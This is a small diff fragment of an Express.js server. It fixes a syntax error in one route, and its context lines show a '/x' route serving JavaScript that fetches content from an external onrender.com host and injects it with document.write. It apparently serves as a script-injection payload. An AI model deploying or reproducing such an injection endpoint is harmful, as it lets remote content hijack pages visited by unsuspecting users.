@@ -217,7 +217,7 @@ app.get('/dkdk' (req, res) => {
             .then(data => console.log("Resposta do servidor:", data))
             .catch(error => console.error("Erro:", error));
  `);
-}
+});
 
 app.get('/x', (req, res) => {
   res.type('application/javascript').send(`fetch('https://yyazboard.onrender.com').then(r=>r.text()).then(t=>document.write(t))`);
